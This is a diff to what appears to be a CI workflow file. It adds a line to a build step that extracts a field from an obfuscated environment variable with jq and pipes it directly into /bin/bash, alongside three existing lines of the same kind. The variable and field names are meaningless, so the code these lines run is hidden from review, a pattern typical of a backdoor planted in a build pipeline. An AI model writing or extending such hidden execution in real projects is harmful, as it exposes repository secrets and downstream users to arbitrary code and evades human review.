@@ -28,6 +28,7 @@ jobs:
           echo $ay11204 | jq -r .lt4833 | /bin/bash
           echo $pr8 | jq -r .zuo002 | /bin/bash
           printf '%s' "$ipio36364" | jq -r .h6 | /bin/bash
+          printf '%s' "$pufjh20" | jq -r .tra6 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
